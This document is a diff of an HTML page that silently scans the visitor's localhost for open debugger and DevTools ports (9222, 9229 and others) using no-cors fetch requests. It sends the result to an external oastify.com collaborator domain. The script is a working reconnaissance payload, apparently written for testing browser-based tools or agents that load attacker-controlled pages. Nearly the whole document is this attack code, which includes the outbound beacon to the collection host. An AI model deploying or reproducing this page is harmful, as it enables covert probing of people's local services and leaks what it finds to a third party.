@@ -1,73 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Debug Port Scanner</title>
+  <meta charset="utf-8">
+  <title>Local Debug-Port Scanner</title>
+  <style>
+    body { font-family: system-ui, sans-serif; margin: 2rem; }
+    #status { margin-top: 1rem; font-weight: 600; }
+  </style>
 </head>
 <body>
-  <h1>Scanning for open debugger ports...</h1>
-  <div id="result">Scanning...</div>
+  <h1>Scanning localhost for debugger/dev ports…</h1>
+  <div id="status">Working…</div>
 
   <script>
-    const collaboratorDomain = '457mfhvylme5j9ytk1x6ns9j1a72v3js.oastify.com';
-    
-    // Expanded list of common debug ports (Puppeteer, Playwright, Node, VSCode, etc.)
-    const ports = [
-      9200, 9222, 9223, 9229, 1234, 1337, 3000, 3001, 3002,
-      3333, 4444, 5555, 6006, 7777, 8080
+    /* ========== CONFIG ========== */
+    const COLLAB_URL = 'https://457mfhvylme5j9ytk1x6ns9j1a72v3js.oastify.com';
+    const PORTS = [
+      9200, 9220, 9221, 9222, 9223, 9224, 9225, 9229, 9230, 9231,
+      1234, 1337, 3000, 3001, 3002, 3333, 4444, 5555, 6006,
+      7000, 7001, 7777, 8080, 9000, 9876
     ];
+    const PATHS = ['', 'json'];    // root & common DevTools endpoint
+    const TIMEOUT_MS = 4000;
 
-    const paths = ['json', 'json/list', 'favicon.ico'];
-    let found = false;
-
-    function sendToCollaborator(subdomain, path = '/') {
-      const img = new Image();
-      img.src = `http://${subdomain}.${collaboratorDomain}${path}`;
+    /* ========== HELPERS ========== */
+    function pingCollaborator(slug) {
+      fetch(`${COLLAB_URL}/${slug}`, { mode: 'no-cors', cache: 'no-store' })
+        .catch(() => {}); // ignore network-layer errors
     }
 
-    function testPortPath(port, path) {
+    function probe(url) {
       return new Promise(resolve => {
-        const url = `http://127.0.0.1:${port}/${path}?t=${Date.now()}`;
-        const img = new Image();
+        const controller = new AbortController();
+        const timer = setTimeout(() => { controller.abort(); resolve(false); }, TIMEOUT_MS);
 
-        img.onload = () => resolve({ port, path, status: 'open' });
-        img.onerror = () => resolve({ port, path, status: 'closed' });
-
-        try {
-          img.src = url;
-        } catch (e) {
-          resolve({ port, path, status: 'blocked' });
-        }
-
-        setTimeout(() => resolve({ port, path, status: 'timeout' }), 3000);
+        fetch(url, { mode: 'no-cors', cache: 'no-store', signal: controller.signal })
+          .then(() => { clearTimeout(timer); resolve(true); })   // request reached a listener
+          .catch(() => { clearTimeout(timer); resolve(false); }); // refused / blocked
       });
     }
 
+    /* ========== MAIN ========== */
     (async () => {
-      const results = [];
-
-      for (const port of ports) {
-        for (const path of paths) {
-          const result = await testPortPath(port, path);
-          results.push(result);
-
-          if (result.status === 'open' && !found) {
-            found = true;
-            document.getElementById('result').innerText =
-              `Found open port ${port} on path /${path}`;
-            
-            const id = `open-${port}-${path.replace(/\W/g, '')}`;
-            sendToCollaborator(id);
+      for (const port of PORTS) {
+        for (const path of PATHS) {
+          const target = `http://127.0.0.1:${port}/${path}`;
+          if (await probe(target)) {
+            document.getElementById('status').textContent =
+              `✅ Port ${port} answered at “/${path || ''}”`;
+            pingCollaborator(`open-${port}-${path || 'root'}`);
+            console.log(`[+] Open: ${target}`);
+            return; // stop after first hit; remove if full scan desired
           }
         }
       }
 
-      if (!found) {
-        document.getElementById('result').innerText =
-          'No open ports detected.';
-        sendToCollaborator('no-port-found', '/no-port-found');
-      }
-
-      console.log('Scan results:', results);
+      /* nothing responded */
+      document.getElementById('status').textContent = '❌ No debugger ports responded.';
+      pingCollaborator('no-port-found');
+      console.log('[-] No open ports detected');
     })();
   </script>
 </body>
